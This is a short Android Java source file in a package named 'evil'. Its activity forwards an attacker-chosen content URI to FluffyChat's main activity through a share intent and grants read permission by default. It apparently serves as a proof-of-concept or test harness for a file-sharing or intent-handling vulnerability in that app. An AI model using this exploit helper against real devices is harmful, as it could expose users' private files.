// SPDX-FileCopyrightText: 2019-Present Christian Kußowski
// SPDX-FileCopyrightText: 2019-Present Contributors to FluffyChat
//
// SPDX-License-Identifier: AGPL-3.0-or-later

package t197.evil;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

public class SendActivity extends Activity {
    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent in = getIntent();
        String target = in.getStringExtra("target");
        Intent send = new Intent(Intent.ACTION_SEND);
        send.setClassName(target, "chat.fluffy.fluffychat.MainActivity");
        send.setType("application/octet-stream");
        send.putExtra(Intent.EXTRA_STREAM, Uri.parse(in.getStringExtra("uri")));
        send.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        if (in.getBooleanExtra("grant", true)) send.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        startActivity(send);
        finish();
    }
}
